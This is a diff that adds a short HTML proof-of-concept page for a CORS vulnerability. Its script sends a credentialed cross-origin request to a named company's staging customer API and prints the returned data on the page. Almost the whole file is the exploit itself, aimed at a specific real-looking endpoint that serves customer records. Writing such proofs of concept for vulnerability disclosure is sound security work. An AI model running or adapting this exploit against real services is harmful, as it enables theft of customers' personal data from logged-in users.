@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability PoC</title>
+</head>
+<body>
+    <h2>CORS Vulnerability Exploit PoC</h2>
+    <button onclick="exploit()">Send Exploit Request</button>
+
+    <script>
+        function exploit() {
+            // URL of the vulnerable endpoint
+            const url = "https://api.staging.my.zalora.net/v1/customers/";
+
+            // Send a cross-origin request with credentials (cookies)
+            fetch(url, {
+                method: "GET",
+                credentials: "include", // Include cookies
+                headers: {
+                    "Accept": "application/json",
+                    "Origin": "https://malicious.example.com"  // A domain different from the target
+                }
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Display or log the captured response data
+                console.log("Response:", data);
+                document.body.innerHTML += `<pre>Response Data: ${data}</pre>`;
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
